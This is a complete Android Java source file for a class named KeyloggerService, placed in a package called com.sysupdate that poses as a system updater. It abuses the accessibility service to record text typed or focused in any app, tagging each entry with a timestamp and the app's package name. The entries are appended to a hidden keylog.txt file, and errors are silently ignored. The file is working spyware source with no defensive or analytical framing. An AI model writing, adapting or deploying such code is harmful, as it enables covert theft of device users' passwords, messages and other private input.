package com.sysupdate;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {

    private static final SimpleDateFormat FMT =
            new SimpleDateFormat("MM-dd HH:mm:ss", Locale.US);

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();
        StringBuilder sb = new StringBuilder();

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText() != null && event.getText().size() > 0
                    ? event.getText().get(0) : null;
            if (text != null && text.length() > 0) {
                sb.append("[").append(FMT.format(new Date())).append("] ")
                  .append(event.getPackageName()).append(" :: ")
                  .append(text).append('\n');
            }
        } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) {
                CharSequence txt = src.getText();
                if (txt != null && txt.length() > 0) {
                    sb.append("[").append(FMT.format(new Date())).append("] focus ")
                      .append(event.getPackageName()).append(" :: ")
                      .append(txt).append('\n');
                }
            }
        }

        if (sb.length() > 0) append(sb.toString());
    }

    private void append(String line) {
        try {
            File f = new File(getFilesDir(), "keylog.txt");
            FileOutputStream out = new FileOutputStream(f, true);
            out.write(line.getBytes());
            out.flush();
            out.close();
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}
}